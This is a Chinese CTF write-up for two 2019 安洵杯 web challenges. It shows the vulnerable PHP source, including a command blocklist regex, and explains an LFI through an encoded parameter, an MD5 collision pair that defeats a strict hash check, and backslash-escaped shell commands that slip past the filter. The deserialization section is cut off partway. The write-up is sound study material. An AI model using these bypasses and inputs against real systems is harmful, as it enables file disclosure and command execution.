---
title: 安洵杯2019 web WP
date: 2020-10-19 23:49:05
categories: CTF做题记录
---

<!-- TOC -->

- [[安洵杯 2019]easy_web](#安洵杯-2019easy_web)
- [[安洵杯 2019]easy_serialize_php](#安洵杯-2019easy_serialize_php)

<!-- /TOC -->
<!--more-->
# [安洵杯 2019]easy_web
>LFI，md5强比较绕过，反斜杠在shell中的妙用

这个图是最经典的，放一放吧\
![webdog](https://raw.githubusercontent.com/yq1ng/blog/master/%E5%AE%89%E6%B4%B5%E6%9D%AF2019/image.v19jk3g4hv.png)
URL中的`img`参数像是LFI，解密：两次base64，一次hex。读一下index.php
```php
<?php
error_reporting(E_ALL || ~ E_NOTICE);
header('content-type:text/html;charset=utf-8');
$cmd = $_GET['cmd'];
if (!isset($_GET['img']) || !isset($_GET['cmd'])) 
    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');
$file = hex2bin(base64_decode(base64_decode($_GET['img'])));

$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);
if (preg_match("/flag/i", $file)) {
    echo '<img src ="./ctf3.jpeg">';
    die("xixi～ no flag");
} else {
    $txt = base64_encode(file_get_contents($file));
    echo "<img src='data:image/gif;base64," . $txt . "'></img>";
    echo "<br>";
}
echo $cmd;
echo "<br>";
if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {
    echo("forbid ~");
    echo "<br>";
} else {
    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
        echo `$cmd`;
    } else {
        echo ("md5 is funny ~");
    }
}

?>
<html>
<style>
  body{
   background:url(./bj.png)  no-repeat center center;
   background-size:cover;
   background-attachment:fixed;
   background-color:#CCCCCC;
}
</style>
<body>
</body>
</html>
```
可以RCE，但是要先过一个md5，是一个强判断`if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b']))`，在用数组就不行啦，在2018年强网杯初赛【Web签到】第三关中也出现过这样的，强类型比较且将类型转换成字符串，此时只能进行MD5碰撞进行绕过\
`a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
&b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2`\
然后就可以rce啦，但是过滤这么多函数，正则没写好导致可以用`ca\t flag`，不过flag不在本目录可以先用`l\s /`看看根目录。\
官方预期解是用其他查看文件的函数去找flag，例如`sort`，用`dir /`列出根目录下文件\
反斜杠在shell中的作用：\
反斜线符号“ \ ”在Bash中被解释为转义字符，用于去除一个单个字符的特殊意义，它保留了跟随在之后的字符的字面值，除了换行符。如果在反斜线之后一个换行字符立即出现，转义字符使行得以继续，遇到命令很长时使用反斜线很有效；反斜线从输入流中被移除并有效地忽略

---
# [安洵杯 2019]easy_serialize_php

开箱送码

```php
 <?php

$function = @$_GET['f'];

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}


if($_SESSION){
    unset($_SESSION);
}

$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;

extract($_POST);

if(!$function){
    echo '<a href="index.php?f=highlight_file">source_code</a>';
}

if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}

$serialize_info = filter(serialize($_SESSION));

if($function == 'highlight_file'){
    highlight_file('index.php');
}else if($function == 'phpinfo'){
    eval('phpinfo();'); //maybe you can find something in here!
}else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
}
**```**

看最后，可以读`phpinfo`，在`auto_append_file`发现了`d0g3_f1ag.php`不能访问，应该是LFI去读。
>啥是`auto_append_file`\
在 php.ini 中有两个配置参数，auto_prepend_file 和 auto_append_file，其作用相当于php代码 require 或 include，使用这两个指令包含的文件如果该文件不存在，将产生一个警告
>- `auto_prepend_file` 表示在php程序加载应用程序前加载指定的php文件\
>- `auto_append_file` 表示在php代码执行完毕后加载指定的php文件

源码最后有一个`file_get_contenets`，正好是读文件的，跟踪一下可以发现`_SESSION`在28行被加密了，不能硬来，既然题目是easy_serialize，那就从31行的反序列化下手。\
